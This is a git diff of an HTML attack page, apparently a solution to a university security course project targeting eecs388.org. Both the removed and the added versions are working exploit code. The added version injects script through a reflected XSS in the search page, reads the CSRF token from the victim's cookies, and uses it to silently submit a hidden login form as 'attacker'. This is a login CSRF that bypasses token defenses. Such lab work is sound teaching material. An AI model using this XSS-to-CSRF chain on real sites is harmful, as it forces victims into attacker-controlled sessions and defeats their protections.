@@ -1,12 +1,22 @@
-<meta charset="utf-8">
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-
-<iframe style='display:none' id='blank_frame'></iframe>
-
-<script>
-  	var form = "<form target='blank_frame' name='csrf' action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0' method='POST'><input name='username' value='attacker' /><input name='password' value='l33th4x' /><input name='token' value='' /></form>";
-  	var set_token = "<script>var get_token=document.getElementsByName('csrf_token')[0].value;document.getElementsByName('token').value=get_token;";
-  	var query = "<iframe name='blank_frame'></iframe>" + form + set_token + "document.csrf.submit()</scrip" + "t>";  
-  	var url = "https://eecs388.org/project2/search?csrfdefense=1&xssdefense=0&q=" + encodeURIComponent(query);
-  	$('#blank_frame').attr("src", url);
-</script>
+<html>
+	<body>
+		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+		<iframe src="https://eecs388.org/project2/search?q=%3Cscript%3Eparent.postMessage%28document.cookie.split%28%27csrf_token%3D%27%29%5B1%5D.substr%280%2C32%29%2C%27*%27%29%3C%2Fscript%3E" names="iframe1" style="display: none;"></iframe>
+		<form id="form1" method="POST" style="display: none;" action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0'>
+			<input type="text" name="username" value="attacker">
+			<input type="password" name="password" value="l33th4x">
+		</form>
+		
+		<script>
+		window.addEventListener("message",function (e)
+		{
+			var add_input = document.createElement("input");
+			add_input.type = "hidden";
+			add_input.name = "csrf_token";
+			add_input.value = new String(e.data);
+			document.getElementById("form1").appendChild(add_input);
+			$.ajax({type: 'POST',data: $('#form1').serialize(),	url: 'https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0',xhrFields: {withCredentials: true}});
+		},false);
+		</script>
+	</body>
+</html>
